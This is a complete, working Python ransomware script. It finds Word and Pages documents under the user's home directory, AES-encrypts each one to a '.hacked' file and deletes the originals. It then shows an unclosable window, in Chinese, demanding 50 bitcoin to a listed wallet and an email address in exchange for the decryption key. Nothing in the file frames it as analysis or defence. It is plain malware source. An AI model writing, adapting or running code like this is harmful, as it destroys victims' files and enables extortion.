# coding:utf-8

import os
import uuid



content = str(uuid.uuid1())
s = content[3] + content[6] + content[9] + content[11]
print s
from hashlib import md5
from Crypto.Cipher import AES
from Crypto import Random

def derive_key_and_iv(password, salt, key_length, iv_length):
    d = d_i = ''
    while len(d) < key_length + iv_length:
        d_i = md5(d_i + password + salt).digest()
        d += d_i
    return d[:key_length], d[key_length:key_length+iv_length]

def encrypt(in_file, out_file, password, key_length=32):
    bs = AES.block_size
    salt = Random.new().read(bs - len('Salted__'))
    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    out_file.write('Salted__' + salt)
    finished = False
    while not finished:
        chunk = in_file.read(1024 * bs)
        if len(chunk) == 0 or len(chunk) % bs != 0:
            padding_length = (bs - len(chunk) % bs) or bs
            chunk += padding_length * chr(padding_length)
            finished = True
        out_file.write(cipher.encrypt(chunk))

def decrypt(in_file, out_file, password, key_length=32):
    bs = AES.block_size
    salt = in_file.read(bs)[len('Salted__'):]
    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    next_chunk = ''
    finished = False
    while not finished:
        chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))
        if len(next_chunk) == 0:
            padding_length = ord(chunk[-1])
            chunk = chunk[:-padding_length]
            finished = True
        out_file.write(chunk)

f = []
home = os.getenv('HOME')
for root, dirs, files in os.walk(home):
    for file in files:
        if file.endswith(".doc") or file.endswith(".docx") or file.endswith(".pages"):
            path = os.path.join(root, file)
            new_path = path + '.hacked'
            f.append(path)
            with open(path, 'rb') as in_file, open(new_path, 'wb') as out_file:
                encrypt(in_file, out_file, s)
            os.unlink(path)
fs = '\n'.join(f)


from Tkinter import *

def quit():
    ns = text3.get("1.0", 'end-1c')
    print ns
    for p in f:
        with open(p + '.hacked', 'rb') as in_file, open(p, 'wb') as out_file:
            decrypt(in_file, out_file, ns.encode('utf-8'))
            # os.unlink(p + '.hacked')


def x():
    pass

if not os.path.exists('/tmp/uuid.txt'):
    with open('/tmp/uuid.txt', 'w') as fp:
        fp.write(content)


root = Tk()
root.title('购买解密KEY，避免文件发生不可逆转的损毁，千万不要退出此程序!!!')
root.resizable(0, 0)
root.protocol('WM_DELETE_WINDOW', x)
w = Label(root, text=u"您的office文档已经被加密，如需解密，请向下面地址支付比特币 ฿50 以换取解密KEY！", fg='red')
w.pack()
text = Text(root, height=8, bg="grey")

text.insert(INSERT, "地址:\n1L6Pun5t4pWTdU7MP1okv2Nex7wtsuNdkS\n-----\n并邮件发送以下内容:\n%s\n至: iobithack@gmail.com\n-----\n您会收到购买的解密KEY" % content)
text.pack()
text2 = Text(root, height=8)
text2.insert(INSERT, "待解密文档列表：\n%s"% fs)
text2.pack()

text3 = Text(root, height=1, bg="gray")
text3.pack()
Button(root, text="在上面灰色框输入购买的解密KEY，然后点此", command=quit).pack()

root.mainloop()

